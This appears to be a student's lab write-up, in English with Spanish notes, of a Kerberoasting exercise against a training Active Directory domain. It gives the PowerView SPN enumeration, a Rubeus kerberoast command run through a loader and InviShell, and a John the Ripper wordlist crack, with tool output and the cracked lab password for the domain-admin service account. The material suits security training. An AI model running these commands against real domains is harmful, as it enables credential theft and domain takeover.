# Learning Objetive 14

* Using the Kerberoasting attack, crack password of a SQL server service account.

***

First, we need to find services running with user accounts as the services running with machine accounts have difficult passwords.

We can use PowerView or ActiveDirectory module for discovering such services:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
```

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

The `svcadmin`, which is a domain administrator has a SPN set! Let’s Kerberoast it!

> **SPN = Service Principal Name**
>
> Es un nombre único que identifica **un servicio** que corre en el dominio.
>
> Ejemplos reales del lab:
>
> * MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433 → SQL Server
> * SNMP/ufc-adminsrv.dollarcorp.moneycorp.local → servicio SNMP
> * HTTP/dcorp-dc.dollarcorp.moneycorp.local → servicio web, etc.

### Rubeus and John the Ripper

> **Regla clave:**
>
> * Solo las **cuentas de usuario** (no las de máquina) que tienen un SPN registrado pueden ser Kerberoasteadas fácilmente.
> * Las cuentas de máquina (dcorp-dc$, etc.) tienen contraseñas muy largas y aleatorias → casi imposibles de crackear.

We can use Rubeus to get hashes for the svcadmin account. Note that we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if ‘**This account supports Kerberos AES 128/256 bit encryption**’ is set for a service account, the below command will not request its hashes.

> Remember use a invishell

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1
[*] Action: Kerberoasting
[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : svcadmin
[*] Target Domain          : dollarcorp.moneycorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svcadmin)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\hashes.txt
```

We can now use John the Ripper to brute-force the hashes.

> Please note that you need to remove “**:1433**” from the SPN in hashes.txt before running John
>
> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*`
>
> should be
>
> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*`
>
> in hashes.txt

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Run the below command after making above changes:

> It bruteforce the password of it user

```
C:\AD\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!!  (?)
1g 0:00:00:00 DONE (2023-03-03 09:18) 90.90g/s 186181p/s 186181c/s 186181C/s energy..mollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

`svcadmin:*ThisisBlasphemyThisisMadness!!`

***

#### ¿Puedo hacerlo con **cualquier** usuario que aparezca en Get-DomainUser -SPN?

**Sí, técnicamente sí**, pero:

* **Cuentas buenas (crackeables):** Cuentas de usuario que se usan como service accounts (websvc, svcadmin, sqladmin, etc.). Tienen contraseñas más débiles.
* **Cuentas malas (casi imposibles de crackear):** Cuentas de máquina (dcorp-dc$, dcorp-ci$, etc.). Tienen contraseñas de 120 caracteres aleatorios.

En el LO 14 el objetivo oficial es **svcadmin** porque es la que tiene el SPN de SQL y es Domain Admin.
